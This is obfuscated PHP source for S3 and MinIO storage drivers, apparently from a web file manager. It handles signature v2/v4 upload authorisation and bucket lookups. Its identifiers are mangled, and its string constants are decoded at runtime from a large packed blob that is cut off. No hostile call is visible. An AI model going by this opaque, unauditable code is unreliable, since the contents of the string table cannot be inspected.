$ϋώ΄χΥ¥; } public function uploadMultiAuth($¶—Η°…Ρ, $›Μ£Τ¦ϊ = array()) { $Ά΅ήΌς =& $_SERVER[γγάψ½]; if ($this->signVer == $Ά΅ήΌς[250]) { if (isset($›Μ£Τ¦ϊ[$Ά΅ήΌς[286]])) { return $this->uploadPartAuthV2($¶—Η°…Ρ, $›Μ£Τ¦ϊ); } return $this->uploadListAuthV2($¶—Η°…Ρ, $›Μ£Τ¦ϊ); } if (isset($›Μ£Τ¦ϊ[$Ά΅ήΌς[286]])) { return $this->uploadPartAuthV4($¶—Η°…Ρ, $›Μ£Τ¦ϊ); } return $this->uploadListAuthV4($¶—Η°…Ρ, $›Μ£Τ¦ϊ); } public function uploadPartAuthV2($ΰΪΤ³, $Ξίγ‡ = array()) { $τΧ›Θχ† =& $_SERVER[γγάψ½]; $Ζ Β”ρ = $Ξίγ‡[$τΧ›Θχ†[97]]; $Ζ»Ύϊ = gmdate($τΧ›Θχ†[282]); $κρω = array_intersect_key($Ξίγ‡, array_flip(array($τΧ›Θχ†[286], $τΧ›Θχ†[284]))); ksort($κρω); $ΐ“’υ§ = $κρω ? $τΧ›Θχ†[76] . http_build_query($κρω, null, $τΧ›Θχ†[287], PHP_QUERY_RFC3986) : $τΧ›Θχ†[12]; $ΐΌζζ¥λ = array($τΧ›Θχ†[256], $τΧ›Θχ†[12], $τΧ›Θχ†[123], $τΧ›Θχ†[12], "\170\x2d\x61\x6d\x7a\x2d\x64\141\164\x65\x3a{$Ζ»Ύϊ}", $τΧ›Θχ†[8] . $this->bucket . $τΧ›Θχ†[8] . $this->pathEncode($Ζ Β”ρ) . $ΐ“’υ§); $£ΖΦώΨ° = implode($τΧ›Θχ†[288], $ΐΌζζ¥λ); $²βΪΩ‡ = $this->client->__getSignature($£ΖΦώΨ°); return array($τΧ›Θχ†[289] => $²βΪΩ‡, $τΧ›Θχ†[285] => $Ζ»Ύϊ); } public function uploadListAuthV2($µΪΫ€Π–, $―ΉεζΘ = array()) { $†ΆΒ‹ν =& $_SERVER[γγάψ½]; $  ηυί = $―ΉεζΘ[$†ΆΒ‹ν[97]]; $λΟΥ«Γν = $―ΉεζΘ[$†ΆΒ‹ν[284]]; $ξΘ‡κΜ½ = $this->client->listParts($this->bucket, $  ηυί, $λΟΥ«Γν); if (!$ξΘ‡κΜ½) { return !1; } $—ΊΞΚ = gmdate($†ΆΒ‹ν[282]); $ϊξ‹ΘΥ = $†ΆΒ‹ν[290] . $λΟΥ«Γν; $ηξΰτΤ = array($†ΆΒ‹ν[291], $†ΆΒ‹ν[12], $†ΆΒ‹ν[123], $†ΆΒ‹ν[12], "\x78\x2d\x61\x6d\172\55\x64\x61\164\145\72{$—ΊΞΚ}", $†ΆΒ‹ν[8] . $this->bucket . $†ΆΒ‹ν[8] . $this->pathEncode($  ηυί) . $ϊξ‹ΘΥ); $—Χ’απ¬ = implode($†ΆΒ‹ν[288], $ηξΰτΤ); $ΘμΩ·· = $this->client->__getSignature($—Χ’απ¬); return array($†ΆΒ‹ν[289] => $ΘμΩ··, $†ΆΒ‹ν[285] => $—ΊΞΚ, $†ΆΒ‹ν[292] => $ξΘ‡κΜ½); } public function uploadPartAuthV4($ς‚ρ†½†, $ΏψΕΪΔΏ = array()) { $™¶Βμ°Ω =& $_SERVER[γγάψ½]; $¨ρ—ιΊ° = $ΏψΕΪΔΏ[$™¶Βμ°Ω[97]]; $ΓεϊΙ ε = array($™¶Βμ°Ω[276] => gmdate($™¶Βμ°Ω[283]), $™¶Βμ°Ω[293] => _get($ΏψΕΪΔΏ, $™¶Βμ°Ω[294], hash($™¶Βμ°Ω[278], $™¶Βμ°Ω[12]))); $“±““”± = explode($™¶Βμ°Ω[211], $this->getHost()); $ΖΒ΅Ζκ = array($™¶Βμ°Ω[295] => $“±““”±[1], $™¶Βμ°Ω[296] => $™¶Βμ°Ω[12], $™¶Βμ°Ω[249] => $™¶Βμ°Ω[123], $™¶Βμ°Ω[297] => $ΏψΕΪΔΏ[$™¶Βμ°Ω[79]]); $¥Δ•Ώ… = $™¶Βμ°Ω[256]; $ ΕΉΓή = $™¶Βμ°Ω[8] . $this->pathEncode($¨ρ—ιΊ°); $‘ΓΔς… = array_intersect_key($ΏψΕΪΔΏ, array_flip(array($™¶Βμ°Ω[286], $™¶Βμ°Ω[284]))); $Ύ£‚Λ» = $this->client->__getSignatureV4($ΓεϊΙ ε, $ΖΒ΅Ζκ, $¥Δ•Ώ…, $ ΕΉΓή, $‘ΓΔς…); return array($™¶Βμ°Ω[289] => $Ύ£‚Λ», $™¶Βμ°Ω[293] => $ΓεϊΙ ε[$™¶Βμ°Ω[293]], $™¶Βμ°Ω[285] => $ΓεϊΙ ε[$™¶Βμ°Ω[276]]); } public function uploadListAuthV4($Τέ‹ώπφ, $γ©‘ώ¬ = array()) { $·ΏΠΰ =& $_SERVER[γγάψ½]; $Υ§άΐ” = $γ©‘ώ¬[$·ΏΠΰ[97]]; $Ξ“δ‹„ = $γ©‘ώ¬[$·ΏΠΰ[284]]; $™Οζόω = $this->client->listParts($this->bucket, $Υ§άΐ”, $Ξ“δ‹„); if (!$™Οζόω) { return !1; } $Π΅υ†ώ = $·ΏΠΰ[298]; foreach ($™Οζόω as $ΖΞ‡Ϋβ) { $Π΅υ†ώ .= $·ΏΠΰ[299] . "\74\120\x61\162\164\116\x75\155\142\x65\x72\76{$ΖΞ‡Ϋβ[$·ΏΠΰ[300]]}\74\57\120\x61\162\x74\116\165\x6d\142\x65\x72\x3e\12" . "\74\x45\124\141\147\x3e{$ΖΞ‡Ϋβ[$·ΏΠΰ[301]]}\x3c\57\105\124\141\147\76\12" . $·ΏΠΰ[302]; } $Π΅υ†ώ .= $·ΏΠΰ[303]; $΄ΪεΫφ = array($·ΏΠΰ[276] => gmdate($·ΏΠΰ[283]), $·ΏΠΰ[293] => hash($·ΏΠΰ[278], $Π΅υ†ώ)); $ΟηΆσ = explode($·ΏΠΰ[211], $this->getHost()); $―„ξγϋύ = array($·ΏΠΰ[295] => $ΟηΆσ[1], $·ΏΠΰ[249] => $·ΏΠΰ[123], $·ΏΠΰ[297] => strlen($Π΅υ†ώ)); $νΫΊχ® = $·ΏΠΰ[291]; $ζΙξόΏΑ = $·ΏΠΰ[8] . $this->pathEncode($Υ§άΐ”); $Ο‘—χ‘ζ = array($·ΏΠΰ[284] => $Ξ“δ‹„); $τΩ·–ν = $this->client->__getSignatureV4($΄ΪεΫφ, $―„ξγϋύ, $νΫΊχ®, $ζΙξόΏΑ, $Ο‘—χ‘ζ); return array($·ΏΠΰ[289] => $τΩ·–ν, $·ΏΠΰ[293] => $΄ΪεΫφ[$·ΏΠΰ[293]], $·ΏΠΰ[285] => $΄ΪεΫφ[$·ΏΠΰ[276]], $·ΏΠΰ[292] => $™Οζόω); } private function _isClientAsync() { $ΗΌ½Άς =& $_SERVER[γγάψ½]; static $ξΐΌΐ = null; if ($ξΐΌΐ === null) { $ε“΄Βθ = isset($_REQUEST[$ΗΌ½Άς[304]]) ? json_decode($_REQUEST[$ΗΌ½Άς[304]], !0) : !1; $ξΐΌΐ = $ε“΄Βθ && _get($ε“΄Βθ, $ΗΌ½Άς[305]) == $ΗΌ½Άς[306]; } return $ξΐΌΐ; } public function getHost() { $γίΧχρ =& $_SERVER[γγάψ½]; $¦£ΜΕ = parent::getHost(); if (!isset($this->osType)) { $this->osType = $this->getType(); } if (!in_array($this->osType, array($γίΧχρ[70], $γίΧχρ[64], $γίΧχρ[69], $γίΧχρ[62]))) { return $¦£ΜΕ . $γίΧχρ[8] . $this->bucket; } if ($this->osType == $γίΧχρ[62] && !is_domain($¦£ΜΕ)) { return $¦£ΜΕ . $γίΧχρ[8] . $this->bucket; } $¦£ΜΕ = explode($γίΧχρ[211], $¦£ΜΕ); return $¦£ΜΕ[0] . $γίΧχρ[211] . $this->bucket . $γίΧχρ[10] . $¦£ΜΕ[1]; } public function size($™ΓΛζ) { $ΧΊΛωΛρ = $this->objectMeta($™ΓΛζ); return $ΧΊΛωΛρ ? $ΧΊΛωΛρ[$_SERVER[γγάψ½][79]] : 0; } public function info($ϊΝ›Δ) { if ($this->isFolder($ϊΝ›Δ)) { return $this->folderInfo($ϊΝ›Δ); } else { if ($this->isFile($ϊΝ›Δ)) { return $this->fileInfo($ϊΝ›Δ); } } return !1; } public function exist($ΕΆ©„®) { return $this->isFile($ΕΆ©„®) || $this->isFolder($ΕΆ©„®); } public function isFile($΄³‡©¥) { return !$this->isFolder($΄³‡©¥) && $this->objectMeta($΄³‡©¥); } public function isFolder($’Ί¥ΐ¶Δ) { return $this->cacheMethod($_SERVER[γγάψ½][180], $’Ί¥ΐ¶Δ); } protected function objectMeta($Ζ•ΪΕ) { return $this->cacheMethod($_SERVER[γγάψ½][182], $Ζ•ΪΕ); } protected function _objectMeta($Ωο‡ρ«) { $Ψ——›΄ =& $_SERVER[γγάψ½]; $Ωο‡ρ« = rtrim($Ωο‡ρ«, $Ψ——›΄[8]); try { $ΒΚ¦ίύΖ = $this->client->getObjectInfo($this->bucket, $Ωο‡ρ«); if (!isset($ΒΚ¦ίύΖ[$Ψ——›΄[255]]) && isset($ΒΚ¦ίύΖ[$Ψ——›΄[307]])) { $ΒΚ¦ίύΖ[$Ψ——›΄[255]] = $ΒΚ¦ίύΖ[$Ψ——›΄[307]]; } } catch (Exception $Ϊ†χ¬Ζ) { $ΒΚ¦ίύΖ = !1; } if (!$ΒΚ¦ίύΖ) { } return $ΒΚ¦ίύΖ; } protected function _isFolder($ΟΑέΪ™) { $‚ώΠΒΤμ =& $_SERVER[γγάψ½]; $ΟΑέΪ™ = rtrim($ΟΑέΪ™, $‚ώΠΒΤμ[8]) . $‚ώΠΒΤμ[8]; if ($ΟΑέΪ™ == $‚ώΠΒΤμ[12] || $ΟΑέΪ™ == $‚ώΠΒΤμ[8]) { return !0; } $ΛυΘΰΡΔ = $this->client->getBucket($this->bucket, $ΟΑέΪ™, null, 1); if (empty($ΛυΘΰΡΔ[$‚ώΠΒΤμ[239]])) { return !1; } $Ηΰ•ΣΘΡ = $ΛυΘΰΡΔ[$‚ώΠΒΤμ[239]][0][$‚ώΠΒΤμ[32]]; return stripos($Ηΰ•ΣΘΡ, $ΟΑέΪ™) === 0 ? !0 : !1; if (substr($Ηΰ•ΣΘΡ, -1) == $‚ώΠΒΤμ[8]) { return !0; } if (get_path_this($Ηΰ•ΣΘΡ) == get_path_this($ΟΑέΪ™)) { return !1; } return !0; } public function listObject($ε‚θ΄©μ) { return $this->fileList($ε‚θ΄©μ, $_SERVER[γγάψ½][12], !0); } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($•®άΘΦδ) { $ζηΎ‹Ξ =& $_SERVER[γγάψ½]; parent::__construct($•®άΘΦδ); $this->setSignVersion($ζηΎ‹Ξ[250]); if (!$this->region) { $this->region = $ζηΎ‹Ξ[308]; $this->client->setRegion($this->region); } $this->client->setHeadValid(!1); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function checkRegion() { $Θδ”ϋι• = $this->getBktRegion(); return $this->region == $Θδ”ϋι• ? !0 : !1; } public function uploadFormData($Ι΅ω΅, $ΑΘλΪϋ = 3600) { $½χ“δΪ =& $_SERVER[γγάψ½]; $†¶°ζΆή = $½χ“δΪ[232]; $¶γ‚¥†υ = $½χ“δΪ[260]; $ώ²¦ΨΌ© = $½χ“δΪ[62]; $ζ¶›ψθ‹ = gmdate($½χ“δΪ[261]); $°Σ³Β– = gmdate($½χ“δΪ[262]); $¬ƒ­ΰζΉ = $½χ“δΪ[263]; $ΰ©¤όπ = $ΑΘλΪϋ . $½χ“δΪ[12]; $ΪΡςΩφ = $½χ“δΪ[264]; $²«τΏι½ = array($this->accessKey, $°Σ³Β–, $this->region, $ώ²¦ΨΌ©, $¬ƒ­ΰζΉ); $ζΫσΟΖ± = implode($½χ“δΪ[8], $²«τΏι½); $ΜΏΰ = array($½χ“δΪ[265] => gmdate($½χ“δΪ[266], strtotime($½χ“δΪ[267])), $½χ“δΪ[268] => array(array($½χ“δΪ[269] => $this->bucket), array($½χ“δΪ[309] => $†¶°ζΆή), array($½χ“δΪ[270], $½χ“δΪ[271], $½χ“δΪ[12]), array($½χ“δΪ[270], $½χ“δΪ[272], $½χ“δΪ[12]), array($½χ“δΪ[270], $½χ“δΪ[310], $½χ“δΪ[12]), array($½χ“δΪ[273] => $ΪΡςΩφ), array($½χ“δΪ[274] => $ζΫσΟΖ±), array($½χ“δΪ[275] => $¶γ‚¥†υ), array($½χ“δΪ[276] => $ζ¶›ψθ‹), array($½χ“δΪ[277] => $ΰ©¤όπ))); $Τµρ»‡ν = base64_encode(json_encode($ΜΏΰ)); $ρ΄‹Ϊ = hash_hmac($½χ“δΪ[278], $°Σ³Β–, $½χ“δΪ[279] . $this->secret, !0); $έΠήµόύ = hash_hmac($½χ“δΪ[278], $this->region, $ρ΄‹Ϊ, !0); $θΉ…ς‹ΰ = hash_hmac($½χ“δΪ[278], $ώ²¦ΨΌ©, $έΠήµόύ, !0); $ΧβέΫώ = hash_hmac($½χ“δΪ[278], $¬ƒ­ΰζΉ, $θΉ…ς‹ΰ, !0); $Κ·¦™—Γ = hash_hmac($½χ“δΪ[278], $Τµρ»‡ν, $ΧβέΫώ); $Ω‹“¤αα = array($½χ“δΪ[249] => $½χ“δΪ[12], $½χ“δΪ[297] => $½χ“δΪ[12], $½χ“δΪ[309] => $†¶°ζΆή, $½χ“δΪ[273] => $ΪΡςΩφ, $½χ“δΪ[280] => $Τµρ»‡ν, $½χ“δΪ[311] => $ζΫσΟΖ±, $½χ“δΪ[312] => $¶γ‚¥†υ, $½χ“δΪ[313] => $ζ¶›ψθ‹, $½χ“δΪ[314] => $ΰ©¤όπ, $½χ“δΪ[315] => $Κ·¦™—Γ, $½χ“δΪ[209] => $this->getHost()); return $Ω‹“¤αα; } } goto AΩιƒΒρ¨; E²έ¶ΘίΑ: if (!function_exists('_kodDe')) { function _kodDe($str) { $str = base64_decode($str); $l = strlen($str); $result = ''; $offset = ord($str[0]) - 30; for ($i = 1; $i < $l; $i += 2) { if ($i + 1 < $l) { $result .= chr(ord($str[$i + 1]) + $offset); $result .= chr(ord($str[$i]) + $offset); } else { $result .= chr(ord($str[$i]) + $offset); } } return $result; } } define("\343\343\235\334\370\275", "\x83\xad\xc1\xf9\xf0\xac"); $_SERVER[γγάψ½] = explode("\174\4\174\2\174\5", gzinflate(substr("\37\213\10\0\0\0\0\0\0\23\305\175\11\170\33\325\265\60\24\50\115\150\13\145\151\171\245\300\140\22\154\47\132\154\147\167\342\44\262\54\307\42\262\145\44\71\13\266\231\214\245\261\64".strrev('ύα’3.η.Ϊρζ”––”°“±e¬¥4(RΠµτ΄΅'."\0".''."\r".''."\r".'@­•²Πμ%'."\0".'–VΒK	o#4Q¤±')."\xdf\xfb\xbf\xef\xe7\xc3\xd1\xdc\x7b\xcf\xdd\xcf\x3d\xf7\xdc\x73\xcf\x39\x77\xd7\x2d\xdf\x7b\x61\xeb\xfb\xeb\xe\x5e\xf7\xa5\x75\x87\x5c\xff\xd4\x45\x97\xdd\xfa\x37\xfa\xd\x7f\xe4\xfb\xc4\x4b\xbe\x72\x0\xf9\xef".base64_decode('qEsurqlpmz15esdXL3/ofu1H2v3axdHIs78Of+25+04Njd/+7Mj4gQf89EdX7GhEwDRvI/0=')."\x51\xf2\xa6\xad\xe8\xc3\x86\x65\x5b\x34\x22\x69\xe6\xfb\x8d\x34\xfd\x36\xf2\xf4\xd7\x4f\x7f\xba\x62\x91\xa2\x9e\x33\x6d\x9d\x6\x7d\xf4\x47\x85\x76\x91\x7f\xad\x35\x59\x83\xa5\xab\x1d\xd1\x84\x1a\xef\xea\xec\xc".base64_decode('xRIA1Cin58wUfBW0opaD+gt60UKtkYtTC2ZBzztiRERKs7U+zYKSWprVllBnJLpSTazsDAE=')."\104\237\272\246\244\27\107\150\210\174\306\155\255\150\47\214\234\316\41\206\212\274\135\315\241\45\341\16\45\21\13\164\304\3\301\104\70\332\101\243\203\321\366\366\160\242\74\76\26\215\104\232\3".base64_decode('waXlKZ2xwJL2gILal9VVI99v1iiraMoqpZZ+tBp6NkU/8xprjj1SgK8E/0LTlC9lszTQwb8=').strrev('΄¨‚„ΑBE<υΆh“[Qβ&Άν†„'."\r".'$ωm’΄?KυKΣ¬iΘΡBΘµhΒΚVΏzR')."\xc6\xa2\xed\xa\x4c\x42\x4e\xb3\x6c\xbd\xa8\x2c\x6f\xb\xc5\x42\xa\x6e\x74\x53\x35\xe9\x6b\xb5\x2\xf8\xd2\x81\x86\x42\x9\x44\x22\xca\x44\x25\xd8\x7a\xae\xc0\x8a\xa1\x79\x2a\x14\x16\x8d\xb5\x84\x62\x4a\xf3\x4a"."\x45\x8c\x50\xd2\xcc\xe5\xcc\xbc\xf\x95\x82\x66\xd2\x96\x9a\x1a\x8a\xc5\xe8\x87\x7\xd0\x3b\x12\xc6\x93\x6\x81\x68\x6b\x6b\x3c\xc4\x43\xd0\xb9\xd3\x22\xa8\x25\x33\x0\x3f\x1d\xa1\x54\x7f\xd6\x56\x7\xb5\x6c\x89"."\241\351\0\375\255\206\37\370\65\55\100\335\65\106\336\50\1\232\102\21\246\311\227\25\174\224\30\264\316\142\364\24\174\344\120\176\23\362\365\101\134\37\203\132\315\76\14\264\102\7\351\147\323".strrev('dc2`πƒ\')Gz²7μ½'."\n".'1–ίb›3~α Zgf£ΰxλ#)OΪ/M8©χς;ϊB').base64_decode('U0W29D4PkgYjfCVjWBEqoJZwImD0j4iliOE6eapllopJPYyWDg3XQ7Ru26hzbEDMrkLW1FI=')."\161\275\310\273\146\230\255\250\240\150\311\226\43\113\4\254\325\54\346\132\20\321\220\343\332\321\262\61\104\344\0\133\56\51\151\264\374\65\335\353\275\377\352\355\136\214\376\251\5\212\330\3\355"."\311\350\331\254\252\17\353\260\236\162\251\131\26\33\10\277\325\147\344\375\50\206\6\303\121\65\243\131\231\366\324\54\225\344\142\204\66\245\17\373\12\231\2\54\166\276\276\173\34\370\216\207\255"."\303\264\103\22\271\316\232\111\55\53\167\205\176\147\154\273\20\327\363\51\74\12\320\25\163\50\117\106\251\240\353\0\324\342\121\122\112\273\262\122\151\153\64\32\55\226\61\227\345\137\254\167\74"."\316\342\221\366\60\233\312\124\77\140\52\333\55\252\240\102\303\42\204\117\254\132\255\120\310\32\111\315\66\314\274\337\114\332\272\355\265\354\242\256\101\211\201\144\122\267\54\157\320\314\333\105\63"."\353\15\144\263\346\220\67\132\64\322\106\276\121\231\6\64\30\45\242\265\356\305\164\261\21\26\160\325\174\5\43\15\256\146\132\123\311\356\367\316\145\13\223\103\27\265\274\325\257\27\275\41\130"."\25\215\12\152\54\47\216\14\254\305\260\12\246\145\340\346\65\52\232\155\153\311\14\46\54\242\370\246\317\201\67\362\131\43\257\227\303\242\102\164\157\147\121\113\347\264\106\245\120\352\103\3\0"."\213\21\342\222\30\102\6\206\1\150\124\162\332\260\127\113\263\222\102\303\5\243\250\133\254\327\312\222\366\4\140\124\277\267\35\57\42\103\117\171\343\210\162\103\141\63\352\146\52\10\127\24\226"."\x46\x63\xdb\x12\x89\x4e\x35\xdc\x8a\xb6\xe6\x8e\x90\xda\x1e\x48\x4\xdb\xa0\x74\x5b\x4b\xb3\xa2\x23\x88\x1e\xf3\x22\x59\xe4\xa\x2f\x5a\x4c\x18\x9b\x3a\x50\xe7\x44\x64\xa7\x39\xa4\x17\x51\xc5\xcd\x23\x8d\xca\x80".base64_decode('meozh30sCQPHEVVhwHh+C7Y3puXTuBt9I7ZuuelSM9rIff105fr69H6zCL2xBtPOwY/o+bQ=')."\235\141\145\307\103\261\145\241\230\32\217\266\46\226\7\142\260\357\347\21\346\14\263\326\340\332\263\336\230\236\102\203\230\264\131\76\255\40\106\177\205\27\57\30\134\71\113\305\213\210\245\105\302".base64_decode('S/DYtXgtBOSVoVjZESNn4O7ZPIUMNmIKlkCD/KTPTT3WtJqe1PRaL/p3Wm13T4tvWu8ivyE=')."\362\370\353\175\365\112\103\335\154\245\23\161\51\206\226\125\240\323\145\20\165\112\164\251\163\130\4\206\347\315\274\136\161\141\41\104\62\55\335\333\246\153\210\100\243\211\160\314\213\207\325\105\303"."\237\63\272\170\237\224\150\211\153\136\150\144\54\164\132\127\50\236\120\333\103\211\266\150\13\64\77\24\200\257\74\312\114\332\313\346\30\63\145\260\45\346\241\130\175\130\332\77\304\76\220\224\7".base64_decode('hOTrMIcY5XchUDCjJwcmSENf0BuT0iU2dd30pxewuZf+qGowEgrEVOBmVcNqlbZQHOTkVjU=')."\373\126\43\104\153\327\331\236\2\25\207\163\150\111\213\216\250\316\375\216\365\262\135\40\76\132\101\313\215\24\337\20\121\260\115\67\322\31\150\267\201\213\113\232\131\263\250\145\361\126\300\170\330"."\264\1\124\271\220\55\241\145\340\307\5\47\62\245\134\37\154\134\150\310\322\272\55\330\113\153\4\361\140\71\266\71\243\35\336\16\267\70\266\140\10\371\125\214\272\75\276\102\76\135\73\5\312"."\122\33\146\325\341\10\230\125\350\31\342\263\113\172\171\327\175\111\23\255\363\166\155\100\157\304\175\1\342\66\237\304\262\200\104\77\347\343\55\257\311\115\46\360\154\145\175\71\124\10\51\63\150".base64_decode('8k2anmTmO7c8RS8WzeJJAEG+FbJv4umCwm3OgViIIrDvjMk5FpPhZqMf+j21oRWoSApxbj4=')."\xcb\x46\x93\x80\x3a\xa8\xa5\x52\x95\xa2\x11\xe5\x81\x2\xd6\x31\xb4\x25\x9\x8c\x2d\xf0\xc7\x67\xa0\xff\x5\xf\x90\x32\x73\x1a\xdb\x51\x31\x21\xe2\xd5\xe2\x80\xc5\x43\x64\x9b\xd4\x53\x74\x9f\x74\x44\xd1\x5\x4e"."\243\246\261\52\213\266\211\23\213\16\110\204\244\31\23\32\215\260\2\72\134\342\75\147\143\220\322\263\72\103\260\214\316\130\215\72\0\103\63\303\321\257\237\257\3\164\220\100\261\202\277\63\254"."\30\312\211\31\3\26\136\216\117\136\42\2\163\107\200\127\342\63\213\146\65\112\26\224\10\167\26\365\176\143\230\221\222\141\273\135\53\16\260\216\241\234\142\51\342\200\264\114\133\273\42\21\65".base64_decode('GO1IoIMbjVkeCydCjGIFWtRAsBNCggZyBk5mQWjMYAOgEGqEX/BKaLMumHlEaYFYecWxriw=')."\x29\x25\x58\x9\xc0\x1d\xc1\x7e\xb8\x38\xa\xc4\x13\xe4\x46\xbd\x39\x44\x57\xbc\xbc\x4d\x9d\x5d\xc0\xb\x30\xac\x60\x2c\x71\xf3\x8\xe6\x76\x19\xe9\x48\xe7\x97\xf1\x99\x5f\x1e\x9f\xe9\x6d\x6b\xf\x4\xbd\xf1\xb6"."\100\303\254\331\64\166\145\56\325\223\150\63\254\236\323\171\30\232\63\144\315\124\213\72\132\323\14\27\32\352\352\331\212\103\174\211\46\132\276\322\233\363\342\122\60\113\351\253\253\253\143\145\115".base64_decode('n61kECnh9DtFestOOaXkgC6Tc8s7ZDCaN4Wz41PKB98qkd1N1ZK4OBVltkuWPFIIAVMoi8E=')."\270\144\32\253\145\323\46\302\273\114\116\216\114\161\374\245\141\235\262\134\120\121\106\343\343\204\107\217\55\16\304\320\215\310\231\360\60\243\66\60\372\355\344\261\225\104\345\201\246\254\173\30\106"."\133\264\243\200\167\66\104\265\331\264\235\102\177\46\103\63\112\150\335\26\215\121\151\364\27\261\222\30\315\214\306\241\312\341\134\126\234\277\140\150\140\64\345\256\15\253\50\105\205\24\125\116\151"."\xe3\x74\x80\xcd\x42\x7b\x8b\x6b\x4d\xd0\xcd\x9f\xc6\x2d\x58\x84\x6a\x54\x6\xb1\x34\xc7\xcc\x37\x55\xd7\xfb\xea\xaa\x15\x76\x2a\x6d\xaa\xee\x4a\xb4\x22\x3e\x7d\xd1\xc2\xc9\xb\x82\x66\xae\x80\xc9\xa\x39\x82\xe1".base64_decode('/lLMXQh9XIB5IBbodA1HKKHBrrPAL8Mt8E9UKnQFM2Yr1M5IINEajbUDjhcKAq0KyUqrzSs=')."\50\122\311\362\352\230\117\206\125\240\45\263\56\24\225\307\142\105\105\114\134\121\11\23\127\270\60\161\105\71\46\256\250\204\147\203\200\220\132\116\33\65\363\150\275\242\215\66\347\113\2\132\44"._kodDe('L7HJOgzlxDpXkRcqdS7/F4beflvZH/gXISa2AjZ9XB3HwLP6HLEz3115vytfngBzh6nRnTGD')."\x96\x66\xb5\x33\x16\x6a\xd\xaf\xe0\xc1\xd6\x70\x28\xd2\x12\x57\x83\x81\x60\x9b\x80\xe9\x8\xb4\x43\x0\xf1\x4a\x7a\x36\x65\xf9\x9d\xf0\x2a\x62\x4d\xe3\x5c\xe4\xa6\x2\xc2\x41\xc8\x21\xe5\x52\x99\xfc\x46\x15\x94"."\30\35\163\164\230\16\350\56\26\132\222\236\250\214\124\225\70\243\311\316\364\71\266\325\242\43\32\14\73\73\237\324\320\237\132\45\20\127\354\202\312\67\325\276\21\376\111\272\301\302\210\13\201".strrev('3΄j“$/Σΐ;EHm Fd	„Q 3CH[FΤNsoΠ"9T0ιfb ZΛ“`ϊ').strrev('μΊq†¦aχ8ΩησΖr\'D΅²m_A‰s“Λ]}‹iΌAN†Ώ†@k:2†Xν<Ί¦Ή`')."\243\37\55\144\306\220\230\45\136\176\237\151\102\231\131\174\20\343\33\55\27\210\256\266\30\132\14\263\55\172\72\337\302\0\131\243\113\103\35\52\303\45\32\222\360\217\106\204\142\261\150\14\206".base64_decode('wDYHmDCMJsZC8VCC1b2mZLAB8vumA97qiK2D6v1n9AxNr+n2Tvf1oo/aaYtpEEI9PkeQcds=')."\xa5\x22\xcf\x8d\x39\xc1\x1a\x6b\x51\x6d\x63\x8f\xbf\xc7\x5f\xb3\xa8\xb1\x3b\xe0\x1d\xd5\xbc\xa3\x75\xde\x79\xde\x5e\xc4\xa3\xd7\x4e\x87\x88\xde\xb5\xd\x9e\x99\x67\x62\x0\x4\xb8\xe8\xe4\x5e\xf4\xd3\xd4\xb3\x68"."\x6a\x8f\xf7\x94\xb3\x56\x2d\xee\xee\xe9\xad\x6e\x9c\x7e\x52\x8f\xef\xe4\x9e\xa1\xde\x69\xb5\x8b\x58\x3d\xc9\x52\x11\x1d\x3\xd8\xde\x86\x9a\x9a\x9a\x5e\x83\x9a\x84\xce\xad\x1c\x24\x2f\x91\x62\x2\xc0\x12\x46\x8d"."\202\210\135\73\373\114\26\217\346\120\117\213\34\335\336\236\351\275\213\244\174\122\224\273\56\104\115\21\323\227\341\160\1\357\351\270\147\74\53\136\351\200\37\245\174\122\154\210\170\45\364\151\374"."\0\230\316\213\223\225\135\344\2\322\101\204\235\202\346\256\235\112\177\317\144\23\231\326\207\31\61\310\367\33\214\241\52\345\215\65\354\210\223\327\327\300\207\151\163\214\326\355\41\235\241\7\212"."\167\204\21\162\260\175\0\45\111\241\254\264\157\20\151\26\307\121\216\114\106\101\305\247\275\41\36\102\333\12\314\323\44\200\266\222\132\101\217\113\75\124\325\104\240\71\22\342\107\127\240\275\54"."\x4c\xe8\x60\x33\xbf\x46\x41\x5d\x13\x34\x94\x51\x4\x49\x52\x45\x24\x47\xb0\xd6\xad\x35\x59\x85\x90\x2\x7a\xcc\x6a\x24\x37\x4a\x56\xa9\x80\x4f\x4c\xa\x9a\x71\x34\xb6\xa\xe2\xe0\x94\xa6\x85\xa\x1d\x72\xc8\xa7"."\312\23\120\340\47\41\54\352\324\305\242\307\64\11\332\124\20\63\144\241\223\10\73\13\370\153\172\172\112\335\172\252\267\33\41\276\346\355\357\135\73\343\314\132\46\116\361\367\240\377\130\40\120"."\341\156\103\325\154\66\44\234\22\252\113\102\11\37\156\21\227\146\73\2\74\231\6\315\42\77\132\24\34\147\173\333\264\265\254\243\210\4\216\141\104\212\161\123\40\333\245\363\36\21\264\13\63".base64_decode('HdL1ECGlHVyWynli6X4C54jrto9DeKREFYUdV3VNVYzQ59HCCkrbHJWux4lIwHGnZOlaMZk=')."\151\55\145\263\66\27\314\144\215\1\250\1\126\15\134\161\171\141\47\230\136\51\53\72\225\60\71\345\64\150\106\325\264\112\200\341\174\336\114\365\311\110\47\66\330\45\1\304\312\44\224\32\166"."\35\243\204\73\224\346\150\64\22\12\164\50\170\57\207\75\10\61\12\361\120\147\0\155\140\130\342\31\117\204\340\206\50\334\342\145\345\256\360\62\371\6\377\60\140\330\315\2\75\127\350\266\232"."\x35\x19\x19\x71\x4a\x48\xf0\xe1\xcc\x83\xe5\x14\x1e\xcc\x57\x78\x50\xab\x3d\x58\xb4\xe1\x11\x47\x5f\x8f\xb8\xe5\xf0\xc\x1a\xfa\x10\xf9\xe0\xc7\x52\xf\x9c\x56\x3d\x42\x28\x3\x9f\xe1\x16\x8f\x61\xb5\x90\x53\x37"."\xa9\x80\x24\xb1\x26\xd8\x19\x2c\x80\xce\x6a\x23\x1e\xda\x9c\x88\x3e\xa8\x67\x3d\x4c\x5c\xe3\x61\x6d\xf4\x30\x21\x95\x87\x8\x97\x5a\xa0\x59\x5d\x68\x61\x41\xb3\xc8\x27\xa2\x9f\x19\xf\x46\x20\x8c\xbf\x1e\x71\xef"."\342\61\207\362\172\221\200\300\300\210\3\273\107\34\346\75\351\242\131\52\164\262\72\245\20\155\26\104\210\66\363\210\230\151\332\36\46\367\362\310\2\60\150\105\200\255\223\212\303\131\271\67\144"."\374\335\215\0\374\302\111\345\243\364\5\223\125\76\37\116\331\337\132\132\42\310\75\317\144\373\235\3\206\310\340\70\347\211\7\134\174\55\23\13\25\167\240\125\203\33\76\132\254\374\315\21\64"."\357\104\124\161\315\42\56\327\4\237\353\26\303\270\257\335\160\245\350\60\25\227\252\263\265\64\253\13\23\53\176\324\252\0\112\277\143\